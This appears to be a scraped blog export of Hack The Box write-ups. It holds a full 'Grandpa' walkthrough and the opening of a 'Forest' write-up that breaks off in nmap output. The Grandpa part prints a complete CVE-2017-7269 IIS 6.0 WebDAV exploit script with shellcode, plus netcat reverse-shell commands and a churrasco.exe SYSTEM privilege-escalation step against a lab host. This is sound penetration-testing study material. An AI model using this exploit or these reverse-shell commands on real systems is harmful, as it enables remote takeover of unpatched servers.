b\"\\xdd\\xc6\\xba\\x9e\\xc3\\xbd\\x54\\xd9\\x74\\x24\\xf4\" shellcode += b\"\\x58\\x33\\xc9\\xb1\\x52\\x31\\x50\\x17\\x83\\xc0\\x04\" shellcode += b\"\\x03\\xce\\xd0\\x5f\\xa1\\x12\\x3e\\x1d\\x4a\\xea\\xbf\" shellcode += b\"\\x42\\xc2\\x0f\\x8e\\x42\\xb0\\x44\\xa1\\x72\\xb2\\x08\" shellcode += b\"\\x4e\\xf8\\x96\\xb8\\xc5\\x8c\\x3e\\xcf\\x6e\\x3a\\x19\" shellcode += b\"\\xfe\\x6f\\x17\\x59\\x61\\xec\\x6a\\x8e\\x41\\xcd\\xa4\" shellcode += b\"\\xc3\\x80\\x0a\\xd8\\x2e\\xd0\\xc3\\x96\\x9d\\xc4\\x60\" shellcode += b\"\\xe2\\x1d\\x6f\\x3a\\xe2\\x25\\x8c\\x8b\\x05\\x07\\x03\" shellcode += b\"\\x87\\x5f\\x87\\xa2\\x44\\xd4\\x8e\\xbc\\x89\\xd1\\x59\" shellcode += b\"\\x37\\x79\\xad\\x5b\\x91\\xb3\\x4e\\xf7\\xdc\\x7b\\xbd\" shellcode += b\"\\x09\\x19\\xbb\\x5e\\x7c\\x53\\xbf\\xe3\\x87\\xa0\\xbd\" shellcode += b\"\\x3f\\x0d\\x32\\x65\\xcb\\xb5\\x9e\\x97\\x18\\x23\\x55\" shellcode += b\"\\x9b\\xd5\\x27\\x31\\xb8\\xe8\\xe4\\x4a\\xc4\\x61\\x0b\" shellcode += b\"\\x9c\\x4c\\x31\\x28\\x38\\x14\\xe1\\x51\\x19\\xf0\\x44\" shellcode += b\"\\x6d\\x79\\x5b\\x38\\xcb\\xf2\\x76\\x2d\\x66\\x59\\x1f\" shellcode += b\"\\x82\\x4b\\x61\\xdf\\x8c\\xdc\\x12\\xed\\x13\\x77\\xbc\" shellcode += b\"\\x5d\\xdb\\x51\\x3b\\xa1\\xf6\\x26\\xd3\\x5c\\xf9\\x56\" shellcode += b\"\\xfa\\x9a\\xad\\x06\\x94\\x0b\\xce\\xcc\\x64\\xb3\\x1b\" shellcode += b\"\\x42\\x34\\x1b\\xf4\\x23\\xe4\\xdb\\xa4\\xcb\\xee\\xd3\" shellcode += b\"\\x9b\\xec\\x11\\x3e\\xb4\\x87\\xe8\\xa9\\xb1\\x5d\\xfc\" shellcode += b\"\\x20\\xae\\x63\\x00\\x32\\x95\\xed\\xe6\\x5e\\xf9\\xbb\" shellcode += b\"\\xb1\\xf6\\x60\\xe6\\x49\\x66\\x6c\\x3c\\x34\\xa8\\xe6\" shellcode += b\"\\xb3\\xc9\\x67\\x0f\\xb9\\xd9\\x10\\xff\\xf4\\x83\\xb7\" shellcode += b\"\\x00\\x23\\xab\\x54\\x92\\xa8\\x2b\\x12\\x8f\\x66\\x7c\" shellcode += b\"\\x73\\x61\\x7f\\xe8\\x69\\xd8\\x29\\x0e\\x70\\xbc\\x12\" shellcode += b\"\\x8a\\xaf\\x7d\\x9c\\x13\\x3d\\x39\\xba\\x03\\xfb\\xc2\" shellcode += b\"\\x86\\x77\\x53\\x95\\x50\\x21\\x15\\x4f\\x13\\x9b\\xcf\" shellcode += b\"\\x3c\\xfd\\x4b\\x89\\x0e\\x3e\\x0d\\x96\\x5a\\xc8\\xf1\" shellcode += b\"\\x27\\x33\\x8d\\x0e\\x87\\xd3\\x19\\x77\\xf5\\x43\\xe5\" shellcode += b\"\\xa2\\xbd\\x74\\xac\\xee\\x94\\x1c\\x69\\x7b\\xa5\\x40\" shellcode += b\"\\x8a\\x56\\xea\\x7c\\x09\\x52\\x93\\x7a\\x11\\x17\\x96\" shellcode += b\"\\xc7\\x95\\xc4\\xea\\x58\\x70\\xea\\x59\\x58\\x51\" The edited exploit looks like this: ''' Description:Buffer overflow in the ScStoragePathFromUrl function in the WebDAV service in Internet Information Services (IIS) 6.0 in Microsoft Windows Server 2003 R2 allows remote attackers to execute arbitrary code via a long header beginning with \"If: <http://\" in a PROPFIND request, as exploited in the wild in July or August 2016. Additional Information: the ScStoragePathFromUrl function is called twice Vulnerability Type: Buffer overflow Vendor of Product: Microsoft Affected Product Code Base: Windows Server 2003 R2 Affected Component: ScStoragePathFromUrl Attack Type: Remote Impact Code execution: true Attack Vectors: crafted PROPFIND data Has vendor confirmed or acknowledged the vulnerability?:true Discoverer:Zhiniang Peng and Chen Wu. Information Security Lab & School of Computer Science & Engineering, South China University of Technology Guangzhou, China ''' #------------Our payload set up a ROP chain by using the overflow 3 times. It will launch a calc.exe which shows the bug is really dangerous. #written by Zhiniang Peng and Chen Wu. Information Security Lab & School of Computer Science & Engineering, South China University of Technology Guangzhou, China #-----------Email: edwardz@foxmail.com import socket sock = socket . socket ( socket . AF_INET , socket . SOCK_STREAM ) sock . connect (( '10.10.10.14' , 80 )) pay = 'PROPFIND / HTTP/1.1 \\r\\n Host: localhost \\r\\n Content-Length: 0 \\r\\n ' pay += 'If: <http://localhost/aaaaaaa' pay += ' \\xe6\\xbd\\xa8\\xe7\\xa1\\xa3\\xe7\\x9d\\xa1\\xe7\\x84\\xb3\\xe6\\xa4\\xb6\\xe4\\x9d\\xb2\\xe7\\xa8\\xb9\\xe4\\xad\\xb7\\xe4\\xbd\\xb0\\xe7\\x95\\x93\\xe7\\xa9\\x8f\\xe4\\xa1\\xa8\\xe5\\x99\\xa3\\xe6\\xb5\\x94\\xe6\\xa1\\x85\\xe3\\xa5\\x93\\xe5\\x81\\xac\\xe5\\x95\\xa7\\xe6\\x9d\\xa3\\xe3\\x8d\\xa4\\xe4\\x98\\xb0\\xe7\\xa1\\x85\\xe6\\xa5\\x92\\xe5\\x90\\xb1\\xe4\\xb1\\x98\\xe6\\xa9\\x91\\xe7\\x89\\x81\\xe4\\x88\\xb1\\xe7\\x80\\xb5\\xe5\\xa1\\x90\\xe3\\x99\\xa4\\xe6\\xb1\\x87\\xe3\\x94\\xb9\\xe5\\x91\\xaa\\xe5\\x80\\xb4\\xe5\\x91\\x83\\xe7\\x9d\\x92\\xe5\\x81\\xa1\\xe3\\x88\\xb2\\xe6\\xb5\\x8b\\xe6\\xb0\\xb4\\xe3\\x89\\x87\\xe6\\x89\\x81\\xe3\\x9d\\x8d\\xe5\\x85\\xa1\\xe5\\xa1\\xa2\\xe4\\x9d\\xb3\\xe5\\x89\\x90\\xe3\\x99\\xb0\\xe7\\x95\\x84\\xe6\\xa1\\xaa\\xe3\\x8d\\xb4\\xe4\\xb9\\x8a\\xe7\\xa1\\xab\\xe4\\xa5\\xb6\\xe4\\xb9\\xb3\\xe4\\xb1\\xaa\\xe5\\x9d\\xba\\xe6\\xbd\\xb1\\xe5\\xa1\\x8a\\xe3\\x88\\xb0\\xe3\\x9d\\xae\\xe4\\xad\\x89\\xe5\\x89\\x8d\\xe4\\xa1\\xa3\\xe6\\xbd\\x8c\\xe7\\x95\\x96\\xe7\\x95\\xb5\\xe6\\x99\\xaf\\xe7\\x99\\xa8\\xe4\\x91\\x8d\\xe5\\x81\\xb0\\xe7\\xa8\\xb6\\xe6\\x89\\x8b\\xe6\\x95\\x97\\xe7\\x95\\x90\\xe6\\xa9\\xb2\\xe7\\xa9\\xab\\xe7\\x9d\\xa2\\xe7\\x99\\x98\\xe6\\x89\\x88\\xe6\\x94\\xb1\\xe3\\x81\\x94\\xe6\\xb1\\xb9\\xe5\\x81\\x8a\\xe5\\x91\\xa2\\xe5\\x80\\xb3\\xe3\\x95\\xb7\\xe6\\xa9\\xb7\\xe4\\x85\\x84\\xe3\\x8c\\xb4\\xe6\\x91\\xb6\\xe4\\xb5\\x86\\xe5\\x99\\x94\\xe4\\x9d\\xac\\xe6\\x95\\x83\\xe7\\x98\\xb2\\xe7\\x89\\xb8\\xe5\\x9d\\xa9\\xe4\\x8c\\xb8\\xe6\\x89\\xb2\\xe5\\xa8\\xb0\\xe5\\xa4\\xb8\\xe5\\x91\\x88\\xc8\\x82\\xc8\\x82\\xe1\\x8b\\x80\\xe6\\xa0\\x83\\xe6\\xb1\\x84\\xe5\\x89\\x96\\xe4\\xac\\xb7\\xe6\\xb1\\xad\\xe4\\xbd\\x98\\xe5\\xa1\\x9a\\xe7\\xa5\\x90\\xe4\\xa5\\xaa\\xe5\\xa1\\x8f\\xe4\\xa9\\x92\\xe4\\x85\\x90\\xe6\\x99\\x8d\\xe1\\x8f\\x80\\xe6\\xa0\\x83\\xe4\\xa0\\xb4\\xe6\\x94\\xb1\\xe6\\xbd\\x83\\xe6\\xb9\\xa6\\xe7\\x91\\x81\\xe4\\x8d\\xac\\xe1\\x8f\\x80\\xe6\\xa0\\x83\\xe5\\x8d\\x83\\xe6\\xa9\\x81\\xe7\\x81\\x92\\xe3\\x8c\\xb0\\xe5\\xa1\\xa6\\xe4\\x89\\x8c\\xe7\\x81\\x8b\\xe6\\x8d\\x86\\xe5\\x85\\xb3\\xe7\\xa5\\x81\\xe7\\xa9\\x90\\xe4\\xa9\\xac ' pay += '>' pay += ' (Not <locktoken:write1>) <http://localhost/bbbbbbb' pay += ' \\xe7\\xa5\\x88\\xe6\\x85\\xb5\\xe4\\xbd\\x83\\xe6\\xbd\\xa7\\xe6\\xad\\xaf\\xe4\\xa1\\x85\\xe3\\x99\\x86\\xe6\\x9d\\xb5\\xe4\\x90\\xb3\\xe3\\xa1\\xb1\\xe5\\x9d\\xa5\\xe5\\xa9\\xa2\\xe5\\x90\\xb5\\xe5\\x99\\xa1\\xe6\\xa5\\x92\\xe6\\xa9\\x93\\xe5\\x85\\x97\\xe3\\xa1\\x8e\\xe5\\xa5\\x88\\xe6\\x8d\\x95\\xe4\\xa5\\xb1\\xe4\\x8d\\xa4\\xe6\\x91\\xb2\\xe3\\x91\\xa8\\xe4\\x9d\\x98\\xe7\\x85\\xb9\\xe3\\x8d\\xab\\xe6\\xad\\x95\\xe6\\xb5\\x88\\xe5\\x81\\x8f\\xe7\\xa9\\x86\\xe3\\x91\\xb1\\xe6\\xbd\\x94\\xe7\\x91\\x83\\xe5\\xa5\\x96\\xe6\\xbd\\xaf\\xe7\\x8d\\x81\\xe3\\x91\\x97\\xe6\\x85\\xa8\\xe7\\xa9\\xb2\\xe3\\x9d\\x85\\xe4\\xb5\\x89\\xe5\\x9d\\x8e\\xe5\\x91\\x88\\xe4\\xb0\\xb8\\xe3\\x99\\xba\\xe3\\x95\\xb2\\xe6\\x89\\xa6\\xe6\\xb9\\x83\\xe4\\xa1\\xad\\xe3\\x95\\x88\\xe6\\x85\\xb7\\xe4\\xb5\\x9a\\xe6\\x85\\xb4\\xe4\\x84\\xb3\\xe4\\x8d\\xa5\\xe5\\x89\\xb2\\xe6\\xb5\\xa9\\xe3\\x99\\xb1\\xe4\\xb9\\xa4\\xe6\\xb8\\xb9\\xe6\\x8d\\x93\\xe6\\xad\\xa4\\xe5\\x85\\x86\\xe4\\xbc\\xb0\\xe7\\xa1\\xaf\\xe7\\x89\\x93\\xe6\\x9d\\x90\\xe4\\x95\\x93\\xe7\\xa9\\xa3\\xe7\\x84\\xb9\\xe4\\xbd\\x93\\xe4\\x91\\x96\\xe6\\xbc\\xb6\\xe7\\x8d\\xb9\\xe6\\xa1\\xb7\\xe7\\xa9\\x96\\xe6\\x85\\x8a\\xe3\\xa5\\x85\\xe3\\x98\\xb9\\xe6\\xb0\\xb9\\xe4\\x94\\xb1\\xe3\\x91\\xb2\\xe5\\x8d\\xa5\\xe5\\xa1\\x8a\\xe4\\x91\\x8e\\xe7\\xa9\\x84\\xe6\\xb0\\xb5\\xe5\\xa9\\x96\\xe6\\x89\\x81\\xe6\\xb9\\xb2\\xe6\\x98\\xb1\\xe5\\xa5\\x99\\xe5\\x90\\xb3\\xe3\\x85\\x82\\xe5\\xa1\\xa5\\xe5\\xa5\\x81\\xe7\\x85\\x90\\xe3\\x80\\xb6\\xe5\\x9d\\xb7\\xe4\\x91\\x97\\xe5\\x8d\\xa1\\xe1\\x8f\\x80\\xe6\\xa0\\x83\\xe6\\xb9\\x8f\\xe6\\xa0\\x80\\xe6\\xb9\\x8f\\xe6\\xa0\\x80\\xe4\\x89\\x87\\xe7\\x99\\xaa\\xe1\\x8f\\x80\\xe6\\xa0\\x83\\xe4\\x89\\x97\\xe4\\xbd\\xb4\\xe5\\xa5\\x87\\xe5\\x88\\xb4\\xe4\\xad\\xa6\\xe4\\xad\\x82\\xe7\\x91\\xa4\\xe7\\xa1\\xaf\\xe6\\x82\\x82\\xe6\\xa0\\x81\\xe5\\x84\\xb5\\xe7\\x89\\xba\\xe7\\x91\\xba\\xe4\\xb5\\x87\\xe4\\x91\\x99\\xe5\\x9d\\x97\\xeb\\x84\\x93\\xe6\\xa0\\x80\\xe3\\x85\\xb6\\xe6\\xb9\\xaf\\xe2\\x93\\xa3\\xe6\\xa0\\x81\\xe1\\x91\\xa0\\xe6\\xa0\\x83\\xcc\\x80\\xe7\\xbf\\xbe\\xef\\xbf\\xbf\\xef\\xbf\\xbf\\xe1\\x8f\\x80\\xe6\\xa0\\x83\\xd1\\xae\\xe6\\xa0\\x83\\xe7\\x85\\xae\\xe7\\x91\\xb0\\xe1\\x90\\xb4\\xe6\\xa0\\x83\\xe2\\xa7\\xa7\\xe6\\xa0\\x81\\xe9\\x8e\\x91\\xe6\\xa0\\x80\\xe3\\xa4\\xb1\\xe6\\x99\\xae\\xe4\\xa5\\x95\\xe3\\x81\\x92\\xe5\\x91\\xab\\xe7\\x99\\xab\\xe7\\x89\\x8a\\xe7\\xa5\\xa1\\xe1\\x90\\x9c\\xe6\\xa0\\x83\\xe6\\xb8\\x85\\xe6\\xa0\\x80\\xe7\\x9c\\xb2\\xe7\\xa5\\xa8\\xe4\\xb5\\xa9\\xe3\\x99\\xac\\xe4\\x91\\xa8\\xe4\\xb5\\xb0\\xe8\\x89\\x86\\xe6\\xa0\\x80\\xe4\\xa1\\xb7\\xe3\\x89\\x93\\xe1\\xb6\\xaa\\xe6\\xa0\\x82\\xe6\\xbd\\xaa\\xe4\\x8c\\xb5\\xe1\\x8f\\xb8\\xe6\\xa0\\x83\\xe2\\xa7\\xa7\\xe6\\xa0\\x81 ' shellcode = b \"\" shellcode += b \" \\xdd\\xc6\\xba\\x9e\\xc3\\xbd\\x54\\xd9\\x74\\x24\\xf4 \" shellcode += b \" \\x58\\x33\\xc9\\xb1\\x52\\x31\\x50\\x17\\x83\\xc0\\x04 \" shellcode += b \" \\x03\\xce\\xd0\\x5f\\xa1\\x12\\x3e\\x1d\\x4a\\xea\\xbf \" shellcode += b \" \\x42\\xc2\\x0f\\x8e\\x42\\xb0\\x44\\xa1\\x72\\xb2\\x08 \" shellcode += b \" \\x4e\\xf8\\x96\\xb8\\xc5\\x8c\\x3e\\xcf\\x6e\\x3a\\x19 \" shellcode += b \" \\xfe\\x6f\\x17\\x59\\x61\\xec\\x6a\\x8e\\x41\\xcd\\xa4 \" shellcode += b \" \\xc3\\x80\\x0a\\xd8\\x2e\\xd0\\xc3\\x96\\x9d\\xc4\\x60 \" shellcode += b \" \\xe2\\x1d\\x6f\\x3a\\xe2\\x25\\x8c\\x8b\\x05\\x07\\x03 \" shellcode += b \" \\x87\\x5f\\x87\\xa2\\x44\\xd4\\x8e\\xbc\\x89\\xd1\\x59 \" shellcode += b \" \\x37\\x79\\xad\\x5b\\x91\\xb3\\x4e\\xf7\\xdc\\x7b\\xbd \" shellcode += b \" \\x09\\x19\\xbb\\x5e\\x7c\\x53\\xbf\\xe3\\x87\\xa0\\xbd \" shellcode += b \" \\x3f\\x0d\\x32\\x65\\xcb\\xb5\\x9e\\x97\\x18\\x23\\x55 \" shellcode += b \" \\x9b\\xd5\\x27\\x31\\xb8\\xe8\\xe4\\x4a\\xc4\\x61\\x0b \" shellcode += b \" \\x9c\\x4c\\x31\\x28\\x38\\x14\\xe1\\x51\\x19\\xf0\\x44 \" shellcode += b \" \\x6d\\x79\\x5b\\x38\\xcb\\xf2\\x76\\x2d\\x66\\x59\\x1f \" shellcode += b \" \\x82\\x4b\\x61\\xdf\\x8c\\xdc\\x12\\xed\\x13\\x77\\xbc \" shellcode += b \" \\x5d\\xdb\\x51\\x3b\\xa1\\xf6\\x26\\xd3\\x5c\\xf9\\x56 \" shellcode += b \" \\xfa\\x9a\\xad\\x06\\x94\\x0b\\xce\\xcc\\x64\\xb3\\x1b \" shellcode += b \" \\x42\\x34\\x1b\\xf4\\x23\\xe4\\xdb\\xa4\\xcb\\xee\\xd3 \" shellcode += b \" \\x9b\\xec\\x11\\x3e\\xb4\\x87\\xe8\\xa9\\xb1\\x5d\\xfc \" shellcode += b \" \\x20\\xae\\x63\\x00\\x32\\x95\\xed\\xe6\\x5e\\xf9\\xbb \" shellcode += b \" \\xb1\\xf6\\x60\\xe6\\x49\\x66\\x6c\\x3c\\x34\\xa8\\xe6 \" shellcode += b \" \\xb3\\xc9\\x67\\x0f\\xb9\\xd9\\x10\\xff\\xf4\\x83\\xb7 \" shellcode += b \" \\x00\\x23\\xab\\x54\\x92\\xa8\\x2b\\x12\\x8f\\x66\\x7c \" shellcode += b \" \\x73\\x61\\x7f\\xe8\\x69\\xd8\\x29\\x0e\\x70\\xbc\\x12 \" shellcode += b \" \\x8a\\xaf\\x7d\\x9c\\x13\\x3d\\x39\\xba\\x03\\xfb\\xc2 \" shellcode += b \" \\x86\\x77\\x53\\x95\\x50\\x21\\x15\\x4f\\x13\\x9b\\xcf \" shellcode += b \" \\x3c\\xfd\\x4b\\x89\\x0e\\x3e\\x0d\\x96\\x5a\\xc8\\xf1 \" shellcode += b \" \\x27\\x33\\x8d\\x0e\\x87\\xd3\\x19\\x77\\xf5\\x43\\xe5 \" shellcode += b \" \\xa2\\xbd\\x74\\xac\\xee\\x94\\x1c\\x69\\x7b\\xa5\\x40 \" shellcode += b \" \\x8a\\x56\\xea\\x7c\\x09\\x52\\x93\\x7a\\x11\\x17\\x96 \" shellcode += b \" \\xc7\\x95\\xc4\\xea\\x58\\x70\\xea\\x59\\x58\\x51 \" pay += shellcode pay += '> \\r\\n\\r\\n ' print pay sock . send ( pay ) data = sock . recv ( 80960 ) print data sock . close Now I start a netcat listener on port 443 and run the exploit: kali@kali:~/Documents/HTB/boxes/results/10.10.10.14/exploit$ python2 41738 .py PROPFIND / HTTP/1.1 Host: localhost Content-Length: 0 If: <http://localhost/aaaaaaa潨硣睡焳椶䝲稹䭷佰畓穏䡨噣浔桅㥓偬啧杣㍤䘰硅楒吱䱘橑牁䈱瀵塐㙤汇㔹呪倴呃睒偡㈲测水㉇扁㝍兡塢䝳剐㙰畄桪㍴乊硫䥶乳䱪坺潱塊㈰㝮䭉前䡣潌畖畵景癨䑍偰稶手敗畐橲穫睢癘扈攱ご汹偊呢倳㕷橷䅄㌴摶䵆噔䝬敃瘲牸坩䌸扲娰夸呈ȂȂዀ栃汄剖䬷汭佘塚祐䥪塏䩒䅐晍Ꮐ栃䠴攱潃湦瑁䍬Ꮐ栃千橁灒㌰塦䉌灋捆关祁穐䩬> (Not <locktoken:write1>) <http://localhost/bbbbbbb祈慵佃潧歯䡅㙆杵䐳㡱坥婢吵噡楒橓兗㡎奈捕䥱䍤摲㑨䝘煹㍫歕浈偏穆㑱潔瑃奖潯獁㑗慨穲㝅䵉坎呈䰸㙺㕲扦湃䡭㕈慷䵚慴䄳䍥割浩㙱乤渹捓此兆估硯牓材䕓穣焹体䑖漶獹桷穖慊㥅㘹氹䔱㑲卥塊䑎穄氵婖扁湲昱奙吳ㅂ塥奁煐〶坷䑗卡Ꮐ栃湏栀湏栀䉇癪Ꮐ栃䉗佴奇刴䭦䭂瑤硯悂栁儵牺瑺䵇䑙块 넓栀ㅶ湯ⓣ栁ᑠ栃翾￿￿Ꮐ栃Ѯ栃煮瑰ᐴ栃⧧栁鎑栀㤱普䥕げ呫癫牊祡ᐜ栃清栀眲票䵩㙬䑨䵰艆栀䡷㉓ᶪ栂潪䌵ᏸ栃⧧栁ýTt$X3ɱR1P_>JBBDNŌ>n:oYajAÀ 2e˵#U'1Ja7y[N{ &#94;|S㇠? L1(8QDmy[8v-fYKaߌw]Q;&\\V Z'3wC墽ti{@V| RzǕXpYXQ> d4話] c2&#94;`Ifl<4g#T+f|sai)p}=9wSP!O<K> HTTP/1.1 400 Bad Request Content-Type: text/html Date: Fri, 02 Oct 2020 10:08:45 GMT Connection: close Content-Length: 20 <h1>Bad Request</h1> Nothing happened! No hits at all on the listener. I started doing some research and I found out that the vulnerability in question is CVE-2017-7269 .I also found a metasploit module for it, and although I want to avoid using it, is always a good indication that the exploit has been tested and been around for a while. I then found another exploit on github and I decided to give it a try. The exploit is very similar to the one I tried earlier but it comes with a predefined shellcode, so all we have to do is to provided target IP address and port and source IP address and port. Once I run the exploit I reveice a reverse shell as expected: C:\\Documents and Settings>systeminfo systeminfo Host Name: GRANPA OS Name: Microsoft(R) Windows(R) Server 2003, Standard Edition OS Version: 5.2.3790 Service Pack 2 Build 3790 OS Manufacturer: Microsoft Corporation OS Configuration: Standalone Server OS Build Type: Uniprocessor Free Registered Owner: HTB Registered Organization: HTB Product ID: 69712-296-0024942-44782 Original Install Date: 4/12/2017, 5:07:40 PM System Up Time: 0 Days, 0 Hours, 57 Minutes, 58 Seconds System Manufacturer: VMware, Inc. System Model: VMware Virtual Platform System Type: X86-based PC Processor(s): 1 Processor(s) Installed. [01]: x86 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz BIOS Version: INTEL - 6040000 Windows Directory: C:\\WINDOWS System Directory: C:\\WINDOWS\\system32 Boot Device: \\Device\\HarddiskVolume1 System Locale: en-us;English (United States) Input Locale: en-us;English (United States) Time Zone: (GMT+02:00) Athens, Beirut, Istanbul, Minsk Total Physical Memory: 1,023 MB Available Physical Memory: 795 MB Page File: Max Size: 2,470 MB Page File: Available: 2,329 MB Page File: In Use: 141 MB Page File Location(s): C:\\pagefile.sys Domain: HTB Logon Server: N/A Hotfix(s): 1 Hotfix(s) Installed. [01]: Q147222 Network Card(s): N/A systeminfo shows this is a x86 based Windows 2003 server with no hotfix installed. I can see two users directories under Documents and Settings: C:\\Documents and Settings>dir dir Volume in drive C has no label. Volume Serial Number is 246C-D7FE Directory of C:\\Documents and Settings 04/12/2017 05:32 PM <DIR> . 04/12/2017 05:32 PM <DIR> .. 04/12/2017 05:12 PM <DIR> Administrator 04/12/2017 05:03 PM <DIR> All Users 04/12/2017 05:32 PM <DIR> Harry 0 File(s) 0 bytes 5 Dir(s) 18,090,868,736 bytes free C:\\Documents and Settings>cd harry cd harry Access is denied. I was unable to access the \"Harry\" directory where most probably the user.txt is located. Then I can see the SeImpersonatePrivilege is enables which means we can probably use Juicy Potato to escalate privileges: C:\\Documents and Settings>whoami /priv whoami /priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ========================================= ======== SeAuditPrivilege Generate security audits Disabled SeIncreaseQuotaPrivilege Adjust memory quotas for a process Disabled SeAssignPrimaryTokenPrivilege Replace a process level token Disabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeImpersonatePrivilege Impersonate a client after authentication Enabled SeCreateGlobalPrivilege Create global objects Enabled Wait a minute! this is Windows 2003 and probably not part of the list of OSs we can exploit with Juicy Potato. In fact, checking at http://ohpe.it/juicy-potato/CLSID/ we can see this list: Windows 7 Enterprise Windows 8.1 Enterprise Windows 10 Enterprise Windows 10 Professional Windows Server 2008 R2 Enterprise Windows Server 2012 Datacenter Windows Server 2016 Standard After some research, I found this post . Point \\x03 of the post mentions about \"Windows 2003 / IIS6.0 with Network Service\", which is exactly the situation we are in. The article then refers to the Microsoft Windows Server 2003 - Token Kidnapping Local Privilege Escalation exploit . The exploit will basically allow to add a user under Local Administrators Group hence obtaining admin rights. That being said, the exploit refers to a zip file dubbed Churrasco. Looking around in the web I found a binary at https://github.com/Re4son/Churrasco/raw/master/churrasco.exe so I download it on my Kali box. I started looking for a place where to put that file on the victim machine. I tried the \"All Users\" directory but I failed in copying the file over. I then found the FPSE_search directory under C:\\ and it seems like we have permissions to write there: C:\\>icacls FPSE_search icacls FPSE_search FPSE_search BUILTIN\\Administrators:(F) BUILTIN\\Administrators:(I)(OI)(CI)(F) NT AUTHORITY\\SYSTEM:(I)(OI)(CI)(F) CREATOR OWNER:(I)(OI)(CI)(IO)(F) BUILTIN\\Users:(I)(OI)(CI)(RX) BUILTIN\\Users:(I)(CI)(AD) BUILTIN\\Users:(I)(CI)(WD) Successfully processed 1 files; Failed processing 0 files AD stands for Add Data wheras WD stands for Write Data. Now I start a smbserver on my Kali box: kali@kali:~$ sudo smbserver.py share ~/Documents/HTB/boxes/results/10.10.10.14/exploit Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation [*] Config file parsed [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0 [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0 [*] Config file parsed [*] Config file parsed [*] Config file parsed then I copy the file over: C:\\FPSE_search>copy \\\\10.10.14.9\\share\\churrasco.exe . copy \\\\10.10.14.9\\share\\churrasco.exe . 1 file(s) copied. C:\\FPSE_search>dir dir Volume in drive C has no label. Volume Serial Number is 246C-D7FE Directory of C:\\FPSE_search 10/02/2020 04:06 PM <DIR> . 10/02/2020 04:06 PM <DIR> .. 10/02/2020 03:35 PM 31,232 churrasco.exe 1 File(s) 31,232 bytes 2 Dir(s) 18,094,141,440 bytes free I also copy nc.exe over: C:\\FPSE_search>copy \\\\10.10.14.9\\share\\nc.exe . copy \\\\10.10.14.9\\share\\nc.exe . 1 file(s) copied. then I run the exploit as following: C:\\FPSE_search>churrasco.exe -d \"C:\\FPSE_search\\nc.exe -e cmd.exe 10.10.14.9 4444\" churrasco.exe -d \"C:\\FPSE_search\\nc.exe -e cmd.exe 10.10.14.9 4444\" /churrasco/-->Current User: NETWORK SERVICE /churrasco/-->Getting Rpcss PID ... /churrasco/-->Found Rpcss PID: 680 /churrasco/-->Searching for Rpcss threads ... /churrasco/-->Found Thread: 684 /churrasco/-->Thread not impersonating, looking for another thread... /churrasco/-->Found Thread: 688 /churrasco/-->Thread not impersonating, looking for another thread... /churrasco/-->Found Thread: 696 /churrasco/-->Thread impersonating, got NETWORK SERVICE Token: 0x734 /churrasco/-->Getting SYSTEM token from Rpcss Service... /churrasco/-->Found SYSTEM token 0x72c /churrasco/-->Running command with SYSTEM Token... /churrasco/-->Done, command should have ran as SYSTEM! and I get an administrative reverse shell: kali@kali:~$ sudo rlwrap nc -lnvp 4444 listening on [any] 4444 ... connect to [10.10.14.9] from (UNKNOWN) [10.10.10.14] 1036 Microsoft Windows [Version 5.2.3790] (C) Copyright 1985-2003 Microsoft Corp. C:\\WINDOWS\\TEMP>whoami whoami nt authority\\system From there I was easily able to grab the user.txt : C:\\Documents and Settings\\Harry\\Desktop>type user.txt type user.txt bdff5ec67c3cff017f2bedc146a5d869 and the root.txt : C:\\Documents and Settings\\Administrator\\Desktop>type root.txt type root.txt 9359e905a2c35f861f6a57cecf28bb7b","tags":"blogging","loc":"https://sittingducks.io/Grandpa.html","title":"Grandpa"},{"url":"https://sittingducks.io/Forest.html","text":"Recon The below is an nmap scan report obtained via autorecon (https://github.com/Tib3rius/AutoRecon). I am usually for manual steps because they allow me to learn and memorize stuff but autorecon is among the automated tools I love using because it retrieves lot of information for you that otherwise you may miss. It's easy to get stuck with rabbit holes when you find a single hint but autorecon gets you the full picture so that you can look at things holistically avoiding getting stuck. The tool, after all, is a python script which in turn launches other tools such as nmap , enum4linux , etc. # Nmap 7 . 80 scan initiated Sat Sep 26 06 : 16 : 01 2020 as : nmap -vv --reason -Pn -A --osscan-guess --version-all -p- -oN / home / kali / Documents / HTB / boxes / results / 10 . 10 . 10 . 161 / scans / _full_tcp_nmap . txt - [ 36 / 9248 ] kali / Documents / HTB / boxes / results / 10 . 10 . 10 . 161 / scans / xml / _full_tcp_nmap . xml 10 . 10 . 10 . 161 Increasing send delay for 10 . 10 . 10 . 161 from 0 to 5 due to 15 out of 48 dropped probes since last increase . Increasing send delay for 10 . 10 . 10 . 161 from 5 to 10 due to 16 out of 51 dropped probes since last increase . Increasing send delay for 10 . 10 . 10 . 161 from 20 to 40 due to 19 out of 62 dropped probes since last increase . Increasing send delay for 10 . 10 . 10 . 161 from 40 to 80 due to 39 out of 129 dropped probes since last increase . Nmap scan report for 10 . 10 . 10 . 161 Host is up , received user-set ( 0 . 089s latency ). Scanned at 2020-09-26 06 : 16 : 02 BST for 17582s Not shown : 65500 closed ports Reason : 65500 conn-refused PORT STATE SERVICE REASON VERSION 53 / tcp open domain ? syn-ack | fingerprint-strings : | DNSVersionBindReqTCP : | version | _ bind 88 / tcp open kerberos-sec syn-ack Microsoft Windows Kerberos ( server time : 2020-09-26 10 : 10 : 00Z ) 135 / tcp open msrpc syn-ack Microsoft Windows RPC 139 / tcp open netbios-ssn syn-ack Microsoft Windows netbios-ssn 389 / tcp open ldap syn-ack Microsoft Windows Active Directory LDAP ( Domain : htb . local , Site : Default-First-Site-Name ) 445 / tcp open microsoft-ds syn-ack Windows Server 2016 Standard 14393 microsoft-ds ( workgroup : HTB ) 464 / tcp open kpasswd5 ? syn-ack 593 / tcp open ncacn_http syn-ack Microsoft Windows RPC over HTTP 1 . 0 636 / tcp open tcpwrapped syn-ack 3268 / tcp open ldap syn-ack Microsoft Windows Active Directory LDAP ( Domain : htb . local , Site : Default-First-Site-Name ) 3269 / tcp open tcpwrapped syn-ack 5831 / tcp filtered unknown no-response 5985 / tcp open http syn-ack Microsoft HTTPAPI httpd 2 . 0 ( SSDP / UPnP ) | _http-server-header : Microsoft-HTTPAPI / 2 . 0 | _http-title : Not Found 9389 / tcp open mc-nmf syn-ack . NET Message Framing 10408 / 